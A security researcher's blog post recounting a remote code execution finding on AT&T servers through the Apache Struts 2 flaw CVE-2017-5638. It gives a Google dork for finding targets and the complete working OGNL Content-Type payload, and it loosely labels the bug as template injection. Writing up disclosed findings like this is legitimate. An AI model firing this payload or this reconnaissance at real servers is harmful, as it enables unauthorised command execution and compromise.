---
layout: post
title: "Remote Code Execution in AT&T"
author: Corben Leo
---
I was pentesting AT&T to see if I could find a vulnerability (as one does), around 4-5 days after CVE-2017-5638 was released.   Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is vulnerable to **Server-Side Template Injection**, which allows attackers to execute commands on any vulnerable server. Basically, the file upload interceptor for these vulnerable versions "attempted to resolve error messages using a potentially dangerous function that evaluates OGNL." It's not actually a vulnerability within the Jakarta request wrapper, but rather in the file upload interceptor. <br><br>
I instantly was curious about this vulnerability and went to see if AT&T ran Struts, so I started off with a simple Google dork: `site:att.com + ext:action` and *A LOT* of results came up! I grabbed a random one:  `https://www.att.com/tobrcontract/tobrinfotc.action`<br><br>
I opened up Burp Suite, intercepted the request and sent it to the Repeater. I added this payload in the content-type header to see if it was vulnerable:
```
Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).! (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='uname -a').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
I sent the request and to my surprise, the command executed!<br><br>
![Code Execution](/images/att-rce.png "RCE")
<br><br>
I was absolutely astounded that after a week of this 0day being released, that such a big company would still be vulnerable WHEN they had a security team and bug bounty program! I also identified a subdomain that was vulnerable.<br> All goes to show that if you are WORKING in information security, it would be smart to pay attention to the community and to the news so you can protect yourself.<br><br>
Regardless, that's how I could've pwned AT&T, which would have affected their hundreds millions of customers (<font color="#E22A3C">~147 million</font> wireless customers in the U.S. and Mexico).
<br><br>
Thanks for reading!<br><br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>

